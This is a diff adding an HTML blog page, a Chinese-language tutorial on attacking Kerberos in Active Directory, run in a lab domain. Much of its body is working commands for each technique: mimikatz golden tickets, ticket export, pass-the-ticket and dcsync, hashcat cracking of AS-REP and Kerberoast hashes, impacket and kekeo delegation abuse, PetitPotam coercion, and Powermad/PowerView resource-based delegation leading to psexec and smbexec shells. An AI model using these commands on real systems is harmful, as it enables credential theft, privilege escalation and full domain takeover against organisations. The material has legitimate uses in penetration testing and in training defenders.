@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>Kerberos: 利用</title>
+    <meta name="description" content="Kerberos TGT请求">
+    <meta name="keywords" content='Kerberos'>
+
+    <meta property="og:url" content="https://gokarna-hugo.netlify.app/posts/2022/kerberos-attack/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Kerberos: 利用">
+    <meta property="og:description" content="Kerberos TGT请求">
+    <meta property="og:image" content="/images/home.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Kerberos: 利用">
+    <meta name="twitter:description" content="Kerberos TGT请求">
+    <meta property="twitter:domain" content="https://gokarna-hugo.netlify.app/posts/2022/kerberos-attack/">
+    <meta property="twitter:url" content="https://gokarna-hugo.netlify.app/posts/2022/kerberos-attack/">
+    <meta name="twitter:image" content="/images/home.jpg">
+
+    
+    <link rel="canonical" href="https://gokarna-hugo.netlify.app/posts/2022/kerberos-attack/" />
+
+    <link rel="stylesheet" type="text/css" href="https://gokarna-hugo.netlify.app/css/normalize.min.css" media="print" onload="this.media='all'">
+    <link rel="stylesheet" type="text/css" href="https://gokarna-hugo.netlify.app/css/main.css">
+    <link disabled id="dark-theme" rel="stylesheet" href="https://gokarna-hugo.netlify.app/css/dark.css">
+
+    <script src="https://gokarna-hugo.netlify.app/js/svg-injector.min.js"></script>
+    <script src="https://gokarna-hugo.netlify.app/js/feather-icons.min.js"></script>
+    <script src="https://gokarna-hugo.netlify.app/js/main.js"></script>
+
+    
+    
+        <!-- KaTeX -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css" integrity="sha384-Xi8rHCmBmhbuyyhbI88391ZKP2dmfnOl4rT9ZfRI7mLTdk1wblIUnrIq35nqwEvC" crossorigin="anonymous">
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js" integrity="sha384-X/XCfMm41VSsqRNQgDerQczD69XqmjOOOwYQvr/uuC+j4OPoNhVgjdGFwhvN02Ja" crossorigin="anonymous"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js" integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"></script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+          // customised options
+          // • auto-render specific keys, e.g.:
+          delimiters: [
+            {left: '$$', right: '$$', display: true},
+            {left: '$', right: '$', display: false},
+          ],
+          // • rendering keys, e.g.:
+          throwOnError : false
+        });
+      });
+    </script>
+  
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://gokarna-hugo.netlify.app">
+                <img src="https://gokarna-hugo.netlify.app/images/home.jpg" alt="avatar" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://gokarna-hugo.netlify.app">2867a0</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://gokarna-hugo.netlify.app/"><span data-feather='home'></span> Home </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://gokarna-hugo.netlify.app/posts"><span data-feather='book'></span> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://gokarna-hugo.netlify.app/tags/"><span data-feather='tag'></span> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://gokarna-hugo.netlify.app/about/"><span data-feather='code'></span> About </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/2867a0"><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://gokarna-hugo.netlify.app/"><span data-feather='home'></span> Home </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://gokarna-hugo.netlify.app/posts"><span data-feather='book'></span> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://gokarna-hugo.netlify.app/tags/"><span data-feather='tag'></span> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://gokarna-hugo.netlify.app/about/"><span data-feather='code'></span> About </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/2867a0"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>Kerberos: 利用</h1>
+        <small role="doc-subtitle">Kerberos TGT请求</small>
+        <p class="post-date">
+            March 5, 2022
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://gokarna-hugo.netlify.app/tags/kerberos">Kerberos</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <hr>
+<h2 id="tgt阶段">TGT阶段</h2>
+<h3 id="黄金票据">黄金票据</h3>
+<p>利用的是<code>第二次：身份认证</code>请求包，身份认证返回包中的<code>ticket</code>使用<code>krbtgt</code>的 NTLM hash加密，如果能获得krbtgt hash，就能自己制作TGT票据。即黄金票据</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kerberos::golden /domain:<span style="color:#f92672">[</span>domain<span style="color:#f92672">]</span> /sid:<span style="color:#f92672">[</span>domain sid<span style="color:#f92672">]</span> /id:500 /user:AnyFuckUser /krbtgt:<span style="color:#f92672">[</span>krbtgt NTLM Hash<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p><img src="/images/2022/kerberos/tgt-1.png" alt="TGT-1"></p>
+<h3 id="用户名枚举">用户名枚举</h3>
+<p>在请求TGT票据协商请求包中，因为服务器没有去验证请求用户的密码，所以可以修改<code>CNameString</code>去猜解域用户名</p>
+<p>nmap的<code>krb5-enum-users</code>脚本使用该方式来枚举用户名。</p>
+<p><img src="/images/2022/kerberos/tgt-2.png" alt="TGT-2"></p>
+<p>python 脚本</p>
+<p><img src="/images/2022/kerberos/pyker-1.png" alt="pyker-1"></p>
+<h3 id="密码爆破密码喷洒">密码爆破/密码喷洒</h3>
+<p>当请求TGT时用户对应的密码不正确，服务器会返回<code>KDC_ERR_PREAUTH_FAILED</code>错误。可以用这个值去暴力破解用户对应的密码。</p>
+<p>（错误密码的数据返回包）</p>
+<p><img src="/images/2022/kerberos/tgt-3.png" alt="TGT-3"></p>
+<p>（正确密码返回的数据包）</p>
+<p><img src="/images/2022/kerberos/tgt-4.png" alt="TGT-4"></p>
+<p>python脚本实现，爆破和喷洒用的都是同一个函数，判断一下返回值就可以了</p>
+<p><img src="/images/2022/kerberos/pyker-2.png" alt="pyker-2"></p>
+<p><img src="/images/2022/kerberos/pyker-3.png" alt="pyker-3"></p>
+<h3 id="as-repoasting">AS-Repoasting</h3>
+<p><img src="/images/2022/kerberos/tgt-6.jpg" alt="TGT-6"></p>
+<p>域内用户可以配置 &ldquo;不要求预身份认证&rdquo;。</p>
+<p>当这些用户向服务器发起协商请求包时，对于通过协商请求的响应包，可以获得响应包中的<code>cipher</code>字段（这部分是使用用户hash加密session-key），将其拼接成 <code>Kerberos 5 AS-REP etype 23</code> 使用hashcat破解出该用户的明文口令。</p>
+<p>拼接方式为：<code>$krb5asrep$23$[user]@[domain]:[cipher前32位]$[cipher后续值]</code></p>
+<p><img src="/images/2022/kerberos/tgt-7.jpg" alt="TGT-7"></p>
+<p><img src="/images/2022/kerberos/tgt-10.jpg" alt="TGT-10"></p>
+<p>用hashcat破解</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">18200</span> hash.txt /usr/share/wordlist/rockyou.txt
+</span></span></code></pre></div><p>impacket里面对于设置该值的用户使用<code>getTGT</code>脚本是获取不到TGT票据的，会报<code>SessionKeyDecryptionError</code>错误。响应数据包中会直接返回TGT票据</p>
+<p><img src="/images/2022/kerberos/tgt-8.png" alt="TGT-8"></p>
+<p>用<code>GetNPUsers</code>脚本就可以解析了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-GetNPUsers yunwei.lab/user:123.com -dc-ip 20.0.0.100
+</span></span></code></pre></div><p><img src="/images/2022/kerberos/tgt-9.png" alt="TGT-9"></p>
+<p>python脚本实现，输入用户名/用户名字典，输出hashcat可直接跑的命令</p>
+<p><img src="/images/2022/kerberos/pyker-4.png" alt="pyker-4"></p>
+<h3 id="path-the-hash--path-the-key">Path The Hash / Path The Key</h3>
+<p>在使用账号密码登录时会把密码加密成hash，所以直接使用hash去认证也可以。如果hash为NTLM + RC4加密，则为Pass The Hash。Hash为AES Key则为Pass The Key</p>
+<h2 id="tgs阶段">TGS阶段</h2>
+<h3 id="kerberoasting">Kerberoasting</h3>
+<p>在请求TGS票据的时候，只要请求的TGT票据是正确的，服务器就会返回请求服务对应的TGS票据，并不会去检查访问权限。</p>
+<p>返回的TGS票据中<code>ticket.enc_part</code>是用要请求的服务NTLM Hash加密的，爆破这个值就能获得请求服务的NTLM Hash</p>
+<p>hashcat 对应Hash类型<code>13100</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-GetUserSPNs yunwei.lab/jm:123.com -save -outputfile 1.hash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">13100</span> -a <span style="color:#ae81ff">0</span> 1.hash /usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><p><img src="/images/2022/kerberos/tgs-1.png" alt="TGS-1"></p>
+<p>python脚本的实现，这里的<code>sname</code>的spn对应的用户，在daiker的文章里面是spn对应的具体服务，两者都可以，只是这里我的脚本并没有支持</p>
+<p><img src="/images/2022/kerberos/pyker-5.png" alt="pyker-5"></p>
+<h3 id="白银票据">白银票据</h3>
+<p>这个ticket用于AP_REQ的认证。其中里面的enc_part是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，而在TGS_REQ里面是使用要请求的服务的hash加密的。因此如果我们拥有服务的hash就可以自己制作一个ticket，既白银票据。</p>
+<p><img src="/images/2022/kerberos/tgs-2.png" alt="TGS-2"></p>
+<!-- raw HTML omitted -->
+<h3 id="非域约束委派">非域约束委派</h3>
+<p>假设这样一个场景，如果域管理员账户委托一台域机器去访问域控的SMB服务，恰巧这台域机器设置了非约束委派机制，那么域管理员账户会将它的TGT缓存到这台域机器，以便后续使用。</p>
+<h4 id="环境配置">环境配置</h4>
+<p>非域约束委派需要两台机器，Server 2012为域控，Win7为域内的普通机器。</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>主机名</th>
+<th>登录账户</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Windows Server 2012</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Windows 7</td>
+<td>WIN7</td>
+<td>john</td>
+</tr>
+</tbody>
+</table>
+<h5 id="域控的配置">域控的配置</h5>
+<p>首先在<code>Computers</code>文件夹中将<code>Windows 7</code>对应的机器设置为<strong>信任此计算机来委派任何服务</strong>（非约束委派）</p>
+<p><img src="/images/2022/kerberos/tgs-3.png" alt="TGS-3"></p>
+<p>然后将<code>Windows 7</code>中登录的用户<code>john</code>设置spn</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>setspn -A anysrv/WIN7.test.lab john
+</span></span></code></pre></div><p>之后在<code>Users</code>文件夹中选中将<code>john</code>的委派属性也设置为<code>信任此用户作为任何服务的委派</code>，如图</p>
+<p><img src="/images/2022/kerberos/tgs-4.png" alt="TGS-4"></p>
+<blockquote>
+<p>这个地方需要将设置域机器和其登录的域用户均设置为非约束委派，如果其中一个没设置，域管理员登录时都不会将票据保留在机器中</p>
+</blockquote>
+<p>最后，添加一个计划任务模拟域控登录Windows 7执行命令，经过上面的配置，模拟域控登录<code>Windows 7</code>这台机器，保留票据。</p>
+<blockquote>
+<p>也可以不创建计划任务，这只是一个可选项。不创建计划任务就需要利用Relay来获取域管票据，见下文。</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>schtasks /create /ru test.lab<span style="color:#ae81ff">\a</span>dministrator /sc minute /mo <span style="color:#ae81ff">1</span> /tn saving_ticket /tr <span style="color:#e6db74">&#34;powershell.exe c:/aa.ps1&#34;</span>
+</span></span></code></pre></div><p><code>C:/aa.ps1</code> 的脚本内容如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$pcname=<span style="color:#e6db74">&#34;win7&#34;</span>
+</span></span><span style="display:flex;"><span>$sess = New-PSSession -ComputerName $pcname
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Enter-PSSession -Session $sess
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Invoke-Command -ComputerName $pcname -ScriptBlock { $service = <span style="color:#e6db74">&#34;bits&#34;</span>
+</span></span><span style="display:flex;"><span>    $serviceinfo = get-service $service
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">If</span>($serviceinfo.Status <span style="color:#f92672">-ne</span> <span style="color:#e6db74">&#39;running&#39;</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>{
+</span></span><span style="display:flex;"><span>            Start-Service $service -ErrorAction Stop
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">catch</span>{
+</span></span><span style="display:flex;"><span>            $error[<span style="color:#ae81ff">0</span>].exception.message
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>        write-output <span style="color:#e6db74">&#34;Service is running&#34;</span>
+</span></span><span style="display:flex;"><span>    } }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exit-PSSession
+</span></span></code></pre></div><h5 id="域机器的配置">域机器的配置</h5>
+<p><code>Windows 7</code>这台机器只需要开启WINRM服务就行，开启后会开放<code>5985</code>端口</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>winrm quickconfig
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<h4 id="利用">利用</h4>
+<p>假设<code>Windows 7</code>为我们在内网的立足点，我们使用<code>ADFind</code>这款工具查找具有非约束委派的用户。
+<code>samAccountType</code>中<code>805306368</code>查找的是具有非约束委派的用户，<code>805306369</code>查找的是具有非约束委派的机器</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>AdFind.exe -b <span style="color:#e6db74">&#34;DC=test,DC=lab&#34;</span> -f <span style="color:#e6db74">&#34;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&#34;</span> cn distinguishedName
+</span></span></code></pre></div><p>结果显示，<code>john</code>这个用户具有非约束委派权限</p>
+<p><img src="/images/2022/kerberos/tgs-5.png" alt="TGS-5"></p>
+<p>继续查询哪些域机器具有非约束委派权限</p>
+<p><img src="/images/2022/kerberos/tgs-6.png" alt="TGS-6"></p>
+<p>正好就是我们拿到的立足点机器。所以我们以本地<code>SYSTEM</code>权限执行<code>mimikatz</code>获取所有内存票据。如图，拿到了域管理员留在本机上的<code>ticket</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mimikatz.exe <span style="color:#e6db74">&#34;privilege::debug&#34;</span> <span style="color:#e6db74">&#34;sekurlsa::tickets /export&#34;</span> <span style="color:#e6db74">&#34;exit&#34;</span>
+</span></span></code></pre></div><p><img src="/images/2022/kerberos/tgs-7.png" alt="TGS-7"></p>
+<p>获得<code>ticket</code>后使用<code>mimikatz</code>导入</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mimikatz.exe <span style="color:#e6db74">&#34;kerberos::ptt [0;aa]-2-0.kirbi&#34;</span>
+</span></span></code></pre></div><p>之后就能dcsync了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mimikatz.exe <span style="color:#e6db74">&#34;lsadump::dcsync /all&#34;</span>
+</span></span></code></pre></div><p>或者Cobalt Strike 用psexec进行横向</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jump psexec64 DC smb-local
+</span></span></code></pre></div><p>如果有杀软拦截psexec，而域控又恰巧开启的3389端口，可以利用粘滞键替换拿到权限</p>
+<h4 id="其他">其他</h4>
+<p><a href="https://www.cnblogs.com/Yang34/p/14264356.html">链接</a>里面说可以用打印机的bug让域控访问域机器从而获取票据</p>
+<p>其他<a href="https://juejin.cn/post/7085286428300541983">文章</a>，这里没复现出来，主要是域机器的本地管理员懒得弄了。</p>
+<h4 id="relay--非约束委派打法">Relay + 非约束委派打法</h4>
+<p>Relay的相关原理在别的文章里面有说，利用<code>PetitPotam.exe</code>强制让域控访问非约束委派的机器，就会在该机器上留下域控的票据，之后的利用方式就和上面一样了。</p>
+<pre tabindex="0"><code>PetitPotam.exe &lt;域机器ip&gt; &lt;域控ip&gt; 1
+</code></pre><!-- raw HTML omitted -->
+<h3 id="域约束委派">域约束委派</h3>
+<p>也就是TGS REQ部分，需要扩展S4U2PROXY</p>
+<h4 id="环境配置-1">环境配置</h4>
+<h5 id="域控">域控</h5>
+<p>域约束委派的用户配置如下：</p>
+<ul>
+<li>设置用户的spn属性</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>setspn -A cifs/win81.test.lab jm
+</span></span></code></pre></div><ul>
+<li>配置委派，设置为<code>仅信任此用户作为指定服务的委派</code>、<code>使用任何身份验证协议</code>、添加DC的服务</li>
+</ul>
+<p><img src="/images/2022/kerberos/tgs-8.png" alt="TGS-8"></p>
+<h4 id="域约束委派攻击利用">域约束委派攻击利用</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>AdFind.exe -b <span style="color:#e6db74">&#34;DC=test,DC=lab&#34;</span> -f <span style="color:#e6db74">&#34;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&#34;</span> cn distinguishedName msds-allowedtodelegateto
+</span></span></code></pre></div><p><img src="/images/2022/kerberos/tgs-9.png" alt="TGS-9"></p>
+<p>请求TGT</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kekeo.exe <span style="color:#e6db74">&#34;tgt::ask /user:john /domain:test.lab /password:123.com&#34;</span> <span style="color:#e6db74">&#34;exit&#34;</span>
+</span></span></code></pre></div><p><img src="/images/2022/kerberos/tgs-10.png" alt="TGS-10"></p>
+<p>请求TGS</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kekeo.exe <span style="color:#e6db74">&#34;tgs::s4u /tgt:TGT_john@TEST.LAB_krbtgt~test.lab@TEST.LAB.kirbi /user:Administrator@test.lab /service:cifs/DC.test.lab&#34;</span> <span style="color:#e6db74">&#34;exit&#34;</span>
+</span></span></code></pre></div><p><img src="/images/2022/kerberos/tgs-11.png" alt="TGS-11"></p>
+<p>导入票据，要导入具有cifs权限的票据</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mimikatz-bypass.exe <span style="color:#e6db74">&#34;kerberos::ptt TGS_Administrator@test.lab@TEST.LAB_cifs~DC.test.lab@TEST.LAB.kribi&#34;</span> <span style="color:#e6db74">&#34;exit&#34;</span>
+</span></span></code></pre></div><p><img src="/images/2022/kerberos/tgs-12.png" alt="TGS-12"></p>
+<p>之后就能访问域控<code>dir \\dc.test.lab\c$</code>。cifs服务只能访问服务器的文件，要想做DCSync需要服务器允许委派LDAP服务</p>
+<h4 id="其他-1">其他</h4>
+<p>先知上一篇<a href="https://xz.aliyun.com/t/7217#toc-10">文章</a>提到可以给委派的用户添加一条krbtgt的spn拿到黄金票据</p>
+<!-- raw HTML omitted -->
+<h3 id="基于资源的域约束委派">基于资源的域约束委派</h3>
+<p>基于资源的约束委派(RBCD)是在<code>Windows Server 2012</code>中新加入的功能，与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。<code>RBCD</code>把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。</p>
+<p>也就是说机器自身可以直接在自己账户上配置<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性来设置<code>RBCD</code>。该属性在<code>ADExplorer</code>中显示如下（该属性默认是不存在的，为了方便理解我这里手动添加了一个，不影响后续实验）：</p>
+<p><img src="/images/2022/kerberos/tgs-13.png" alt="TGS-13"></p>
+<p>一般为将机器加入域的用户账户能修改这个属性。</p>
+<p>现在我们知道了谁可以修改这个属性，还需要一个条件就是需要一个具有SPN属性的用户来获取TGT票据。机器账户默认就有两条SPN属性</p>
+<p><img src="/images/2022/kerberos/tgs-14.png" alt="TGS-14"></p>
+<h4 id="环境搭建">环境搭建</h4>
+<p>域控：20.0.0.100，添加普通用户<code>john:123.com</code>作为Win10账户，添加用户<code>AddUser:123.com</code>用户将Win10加入域</p>
+<p>Win10：20.0.0.7，普通机器，用<code>AddUser</code>加入域之后，该机器地<code>mS-DS-CreatorSID</code>属性值会变成<code>AddUser</code>的<code>SID</code>，表明windows 10这台机器是由<code>AddUser</code>这个用户添加进域的</p>
+<h4 id="寻找rbcd机器">寻找RBCD机器</h4>
+<p>我们先手动用<code>ADExplorer</code>查询一遍，了解原理之后就可以很方便地编写工具了。</p>
+<p>查询计算机的<code>mS-DS-CreatorSID</code>确认是由<code>SID</code>为<code>1110</code>添加进来的，而该SID对应的用户为<code>AddUser</code>。所以可以确定能够修改Win10这台机器<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>这个属性的用户为<code>AddUser</code></p>
+<p><img src="/images/2022/kerberos/tgs-15.png" alt="TGS-15"></p>
+<p><img src="/images/2022/kerberos/tgs-16.png" alt="TGS-16"></p>
+<h4 id="提权">提权</h4>
+<p>在windows 10 上，我们以<code>AddUser</code>用户打开一个powershell窗口进行操作</p>
+<pre tabindex="0"><code>runas /user:test.lab\adduser powershell
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># 修改powershell执行策略</span>
+</span></span><span style="display:flex;"><span>Set-ExecutionPolicy Bypass -Scope <span style="color:#66d9ef">Process</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 添加机器账号mach1</span>
+</span></span><span style="display:flex;"><span>Import-Module .\Powermad.ps1
+</span></span><span style="display:flex;"><span>New-MachineAccount -MachineAccount mach1 -Password $(ConvertTo-SecureString <span style="color:#e6db74">&#34;123.com&#34;</span> -AsPlainText -Force)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 查询机器账号SID</span>
+</span></span><span style="display:flex;"><span>Get-DomainComputer -Identity mach1 -Properties objectsid
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 设置WIN10 的资源约束委派属性为机器账号SID</span>
+</span></span><span style="display:flex;"><span>Import-Module .\PowerView.ps1
+</span></span><span style="display:flex;"><span>$SD =New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span style="color:#e6db74">&#39;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-556516541-2133182263-1194801646-1112)&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$SDBytes= New-Object byte[] ($SD.BinaryLength);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$SD.GetBinaryForm($SDBytes,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Get-DomainComputer WIN10 | Set-DomainObject -Set @{<span style="color:#e6db74">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span>=$SDBytes} -Verbose
+</span></span></code></pre></div><p><img src="/images/2022/kerberos/tgs-17.png" alt="TGS-17"></p>
+<p>上述步骤完成后，可以在域控上确认，<code>WIN10</code>机器的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>确实变成了<code>mach1</code>的SID</p>
+<p><img src="/images/2022/kerberos/tgs-18.png" alt="TGS-18"></p>
+<p><img src="/images/2022/kerberos/tgs-19.png" alt="TGS-19"></p>
+<p>之后，就可以用impacket获取<code>mach1</code>的TGT票据，然后<code>psexec</code>、<code>smbexec</code>都可以获得shell</p>
+<pre tabindex="0"><code>impacket-getST -dc-ip 20.0.0.100 test.lab/mach1\$:123.com -spn cifs/win10.test.lab -impersonate administrator
+</code></pre><p><img src="/images/2022/kerberos/tgs-20.png" alt="TGS-20"></p>
+<pre tabindex="0"><code>export KRB5CCNAME=administrator.ccache;impacket-psexec -k -no-pass win10.test.lab
+</code></pre><pre tabindex="0"><code>export KRB5CCNAME=administrator.ccache;impacket-smbexec -k -no-pass win10.test.lab
+</code></pre><p><img src="/images/2022/kerberos/tgs-21.png" alt="TGS-21"></p>
+<p><img src="/images/2022/kerberos/tgs-22.png" alt="TGS-22"></p>
+<h4 id="参考">参考</h4>
+<p><a href="https://mp.weixin.qq.com/s/Ue2ULu8vxYHrYEalEzbBSw">微软不认的“0day”之域内本地提权-烂番茄（Rotten Tomato）</a></p>
+<p><a href="https://www.cnblogs.com/sup3rman/p/16114572.html">https://www.cnblogs.com/sup3rman/p/16114572.html</a></p>
+
+        </p>
+    </div>
+
+    <div class="prev-next">
+        
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#tgt阶段">TGT阶段</a>
+          <ul>
+            <li><a href="#黄金票据">黄金票据</a></li>
+            <li><a href="#用户名枚举">用户名枚举</a></li>
+            <li><a href="#密码爆破密码喷洒">密码爆破/密码喷洒</a></li>
+            <li><a href="#as-repoasting">AS-Repoasting</a></li>
+            <li><a href="#path-the-hash--path-the-key">Path The Hash / Path The Key</a></li>
+          </ul>
+        </li>
+        <li><a href="#tgs阶段">TGS阶段</a>
+          <ul>
+            <li><a href="#kerberoasting">Kerberoasting</a></li>
+            <li><a href="#白银票据">白银票据</a></li>
+            <li><a href="#非域约束委派">非域约束委派</a>
+              <ul>
+                <li><a href="#环境配置">环境配置</a></li>
+                <li><a href="#利用">利用</a></li>
+                <li><a href="#其他">其他</a></li>
+                <li><a href="#relay--非约束委派打法">Relay + 非约束委派打法</a></li>
